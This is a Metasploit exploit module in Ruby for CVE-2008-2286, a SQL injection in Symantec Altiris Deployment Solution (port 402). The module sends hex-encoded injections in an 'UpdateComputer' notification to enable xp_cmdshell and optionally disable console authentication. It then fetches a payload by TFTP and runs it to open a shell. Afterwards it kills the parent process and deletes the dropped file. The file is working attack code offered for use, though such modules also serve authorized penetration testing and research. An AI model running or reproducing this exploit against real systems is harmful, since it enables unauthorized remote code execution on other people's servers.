##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
 Rank = NormalRanking

 include Msf::Exploit::CmdStagerTFTP
 include Msf::Exploit::Remote::Tcp
 include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Symantec Altiris DS SQLi 6.8 - 6.9.164',
      'Description'    => %q{
        This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution. The
        vulnerability exists on axengine.exe which fails to adequately sanitize numeric input
        fields in "UpdateComputer" notification Requests. In order to spawn a shell, several SQL
        injections are required in close succession, first to enable xp_cmdshell, then retrieve
        the payload via TFTP and finally execute it. The module also has the capability to disable
        or enable local application authentication.
      },
      'Author'         =>
        [
          'Brett Moore',  # Vulnerability discovery
          '3v0lver'       # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-2286' ],
          [ 'OSVDB', '45313' ],
          [ 'BID', '29198'],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-08-024' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Targets' =>
        [
          [ 'Windows 2003 (with tftp client available)',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win'
            }
          ]
        ],
      'Privileged' => true,
      'Platform' => 'win',
      'DisclosureDate' => 'May 15 2008',
      'DefaultTarget' => 0))

    register_options(
    [
      Opt::RPORT(402),
      OptBool.new('XP_CMDSHELL',      [ false, "Enable xp_cmdshell prior to exploit", true]),
      OptBool.new('DISABLE_SECURITY', [ false, "Exploit SQLi to execute wc_upd_disable_security and disable Console Authentication", false ]),
      OptBool.new('ENABLE_SECURITY',  [ false, "Enable Local Deployment Console Authentication", false ])
    ], self.class)

  end

  def windows_stager
    # CmdStagerVBS was tested here as well, however delivery took roughly
    # 30 minutes and required sending almost 350 notification messages.
    # size constraint requirement for SQLi is: linemax => 393
    execute_cmdstager({ :delay => 1.5, :temp => '%TEMP%\\'})
  end

  def execute_command(cmd, opts = {})
    xp_shell_enable = datastore['XP_CMDSHELL']
    inject=[]

    if xp_shell_enable == true
      inject+=[
        "#{Rex::Text.to_hex("sp_configure \"show advanced options\", 1; reconfigure",'')}",
        "#{Rex::Text.to_hex("sp_configure \"xp_cmdshell\", 1; reconfigure",'')}",
      ]
      xp_shell_enable = false
    end

    inject+=["#{Rex::Text.to_hex("wc_upd_disable_security",'')}"] if datastore['DISABLE_SECURITY'] == true
    inject+=["#{Rex::Text.to_hex("wc_upd_enable_security",'')}"] if datastore['ENABLE_SECURITY'] == true
    inject+=["#{Rex::Text.to_hex("master.dbo.xp_cmdshell \'cd %TEMP% && cmd.exe /c #{cmd}\'",'')}"] if cmd != nil

    inject.each do |sqli|
      send_update_computer("2659, null, null;declare @querya VARCHAR(255);select @querya = 0x#{sqli};exec(@querya);--")
    end
  end

  def check

    fingerprint = fingerprint_altiris

    if fingerprint =~ /^6\.(\d+)\.(\d+)$/
      print_status "#{rhost}:#{rport} - Altiris DS Version '#{fingerprint}'"
      minor = $1.to_i
      build = $2.to_i
      if minor == 8 and build < 390
        if build == 206 || build == 282 || build == 378
          return Exploit::CheckCode::Vulnerable
        else
          return Exploit::CheckCode::Appears
        end
      elsif minor == 9 and build < 176
        #The existence of versions matching this profile is a possibility... none were observed in the wild though
        #as such, we're basing confidence off of Symantec's vulnerability bulletin.
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Safe
      end
    else
      print_status "#{rhost}:#{rport} - This version isn't exploitable: #{fingerprint}"
      return Exploit::CheckCode::Safe
    end

  end

  def fingerprint_altiris
    response = send_update_computer("2659")

    if(response)
      result_regex = /Result=(.*)/
      result_response = result_regex.match(response)
      if result_response[1] == "Success"
        version_regex = /DSVersion=(.*)/
        altiris_version = version_regex.match(response)
        return "#{altiris_version[1]}"
      else
        return "unexpected \"UpdateComputer\" response: '#{result_response[1]}'"
      end
    else
        return "No response received, possible congestion issue..."
    end
  end

  def exploit
    windows_stager
  end

 def send_update_computer(processor_speed)

   notification = %Q|Request=UpdateComputer
OS-Bit=32
CPU-Arch=x86
IP-Address=192.168.20.107
MAC-Address=005056C000AB
Name=Remove_test
OS=Windows XP
Version=2.6-38 (32-Bit)
LoggedIn=Yes
Boot-Env=Automation
Platform=Linux
Agent-Settings=Same
Sys-Info-TimeZoneBias=0
Processor=Genuine Intel Intel(R) Core(TM) i7 CPU M 620 @ 2.67GHz
Processor-Speed=#{processor_speed}
\x00
   |

   connect
   sock.put(notification)
   response = sock.get_once()
   disconnect

   return response

 end

  def on_new_session(client)

    return if not payload_exe
    #can't scrub dropped payload while the process is still active so...
    #iterate through process list, find our process and the associated parent process ID, Kill the parent
    client.core.use("stdapi")
    client.console.run_single("run migrate -f")
    client.sys.process.get_processes().each do |proc|
      if proc['pid'] == client.sys.process.open.pid
          client.sys.process.kill(proc['ppid'])
      end
    end

    wintemp = client.fs.file.expand_path("%TEMP%")
    windir = client.fs.file.expand_path("%WINDIR%")
    delete_me = "#{wintemp}\\#{payload_exe}"
    cmd = "#{windir}\\system32\\attrib.exe -r -h -s " + delete_me
    client.sys.process.execute(cmd, nil, {'Hidden' => true })
    print_warning("Attempting to delete #{delete_me} ...")

    begin
      register_file_for_cleanup("#{delete_me}")
    rescue ::Exception => e
      print_error("Exception: #{e.inspect}")
      return
    end

    rescue ::Exception => e
    print_error("Exception: #{e.inspect}")
  end

end
